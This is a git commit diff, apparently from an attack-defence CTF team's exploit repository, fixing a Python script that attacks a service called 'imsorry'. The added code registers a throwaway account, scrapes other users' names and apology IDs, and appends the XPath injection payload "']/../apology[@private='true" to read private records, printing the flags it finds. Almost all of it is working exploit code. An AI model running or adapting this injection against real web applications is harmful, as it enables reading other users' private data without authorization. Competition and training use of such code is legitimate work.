8859b3129beffa896ee7ae39fc378547478e5c86
Alexander <crash.1244@yandex.ru>
2019-03-28 12:46:15 +0300

    Update tesh0k0t_imsorry_xpath.py
    fix sploit xpath

--- sploits/imsorry/tesh0k0t_imsorry_xpath.py
+++ sploits/imsorry/tesh0k0t_imsorry_xpath.py
@@ -1,14 +1,11 @@
-import requests as rq
-import sys 
-from random import choice, randint
 from string import  ascii_letters
 from base64 import b64encode
+from random import choice, randint
 import requests as rq
 import sys 
+import re
 
-host = sys.argv[0]
-
-def gen_random_string(N=5):
+def gen_random_string(N=10):
 	return "".join(choice(ascii_letters) for i in range(N))
 
 def create_headers(username, password):
@@ -16,18 +13,27 @@ def create_headers(username, password):
 	headers = {"Authorization":"Basic {}".format(auth_string)}
 	return headers
 
-username = "FARGATETOP{}".format(randint(10000, 99999))
-
 try:
-	host = sys.argv[0]
+	host = sys.argv[1]
 except:
 	host = "127.0.0.1"
-	# host = "6.6.1.2"
-id_apology = ""
-payload = "{}']/../apology[@private='true".format(id_apology)
-host = "127.0.0.1"
-# host = "6.6.1.2"
 url = "http://{}:14567".format(host)
-rq.get()
+payload = "']/../apology[@private='true"
 
-
+url_register = url + "/register"
+username = gen_random_string()
+password = gen_random_string()
+rq.post(url_register, data={"username":username, "password":password})
+headers = create_headers(username, password)
+res_main_page = rq.get(url)
+mass_login = re.findall(r"<tr>\n<td>(\w+)</td>", res_main_page.text)[1:]
+for login in mass_login:
+	url_det_id = url + "/apology/find?nickname_sender={}".format(login)
+	res_get_ids = rq.get(url_det_id, headers=headers)
+	mass_ids = re.findall(r"amp;id=(\w+)", res_get_ids.text)
+	for id_apology in mass_ids:
+		url_get_apology = url + "/apology/read?nickname_sender={}&id={}".format(login, id_apology)
+		res_apology_flag = rq.get(url_get_apology + payload, headers=headers)
+		mass_flags = re.findall(r"\w{31}=", res_apology_flag.text)
+		for flag in mass_flags:
+			print(flag)
